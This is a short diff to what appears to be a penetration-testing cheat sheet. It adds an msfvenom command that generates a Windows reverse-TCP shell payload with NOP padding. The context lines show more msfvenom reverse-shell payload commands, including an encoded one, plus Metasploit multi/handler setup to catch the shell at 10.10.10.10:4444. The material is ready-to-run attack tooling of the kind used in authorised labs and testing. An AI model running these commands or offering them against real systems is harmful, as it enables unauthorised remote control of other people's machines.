@@ -29,6 +29,9 @@ msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikat
 # Create a payload specifying the VARIABLE name
 msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f py -v shellcode
 
+# Create a payload adding 10 NOPs at the beginning
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f py -n 10
+
 # Multi handler
 use exploit/multi/handler
 set payload windows/shell/reverse_tcp
